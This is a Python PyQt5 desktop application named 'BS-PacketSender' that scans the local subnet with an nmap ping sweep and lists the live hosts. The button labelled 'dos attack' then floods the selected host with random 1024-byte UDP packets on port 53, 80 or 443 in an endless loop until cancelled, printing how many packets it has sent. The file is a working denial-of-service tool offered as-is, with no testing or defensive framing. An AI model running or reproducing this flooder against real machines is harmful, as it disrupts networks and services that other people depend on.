from PyQt5 import QtWidgets , QtGui,QtCore
from ui_app import Ui_MainWindow
import threading
import random
import socket
import time
import nmap
import os
import sys

class Stream(QtCore.QObject):
    newText = QtCore.pyqtSignal(str)
    def write(self, text):
        self.newText.emit(str(text))

class MyWindow(QtWidgets.QMainWindow,Ui_MainWindow):
    End_Flag = False
    sent = 0
    ip = "0"
    port = 0
    def __init__(self):
        super().__init__()
        sys.stdout = Stream(newText=self.onUpdateText)
        self.setupUi(self)
        self.show()
        self.search_ip.clicked.connect(self.search_ip_thread)
        self.listWidget.itemClicked.connect(self.SelectedIP)
        self.dos_attack.clicked.connect(self.dos_thread)
        self.cancel_op.clicked.connect(self.Cancel_op)
        self.actionAbout.triggered.connect(self.About)
        self.actionExit.triggered.connect(self.Quit)
        self.AddPort()
        
        
    def onUpdateText(self, text):
        cursor = self.action_info.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.action_info.setTextCursor(cursor)
        self.action_info.ensureCursorVisible()
    def __del__(self):
        sys.stdout = sys.__stdout__

    def SearchIp(self):
        self.listWidget.clear()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host = s.getsockname()[0]
        #print(host)
        s.close()
        nm = nmap.PortScanner()
        l = nm.scan(hosts = f'{host}/24', arguments = '-sn')
        p = l['scan'].keys()
        p = list(p)
        LenList = len(p)
        for i in range(LenList):
            item = QtWidgets.QListWidgetItem()
            item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsUserCheckable|QtCore.Qt.ItemIsEnabled|QtCore.Qt.ItemIsTristate)
            item.setData(QtCore.Qt.UserRole,'IP')
            item.setText(p[i])
            self.listWidget.addItem(item)
    def search_ip_thread(self):
        thread = threading.Thread(target=self.SearchIp)
        thread.start()
    def SelectedIP(self):
        row = self.listWidget.currentRow()
        item = self.listWidget.item(row)
        self.selected_ip.setText(item.text())
    def AddPort(self):
        t = (53,80,443)
        for p in t:
            self.comboBox.addItem(str(p))     
    def dos_thread(self):
        thread1 = threading.Thread(target=self.DOS)
        thread1.setDaemon(True)
        thread1.start()
        
    def writeinfo(self):
        while not self.End_Flag:
            print("Sent %s amount of packets to %s at port %s."%(self.sent,self.ip,self.port))
            time.sleep(5)
    
    def DOS(self):
        if not self.selected_ip.text() == "":
            self.End_Flag = False
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            bytes=random._urandom(1024)
            self.ip = self.selected_ip.text()
            self.port = int(self.comboBox.currentText())
            th = threading.Thread(target=self.writeinfo)
            th.setDaemon(True)
            th.start()    
            while not self.End_Flag:
                sock.sendto(bytes,(self.ip,self.port)) 
                self.sent = self.sent+1
        else:
            print("You need to enter an IP !")
        
        print("dos ended")

    def Cancel_op(self):
        self.End_Flag = True
        self.action_info.clear()                                

    def Quit(self):
        QtWidgets.QApplication.quit() 

    def About(self):
        msg = QtWidgets.QMessageBox()
        msg.setWindowTitle("About")
        msg.setText("BS-PacketSender:\nVersion:1.0\nDeveloper:Oussama Ben Sassi")
        msg.setIcon(QtWidgets.QMessageBox.Information)
        msg.exec_() 

app = QtWidgets.QApplication(sys.argv)
win = MyWindow()
sys.exit(app.exec_())                 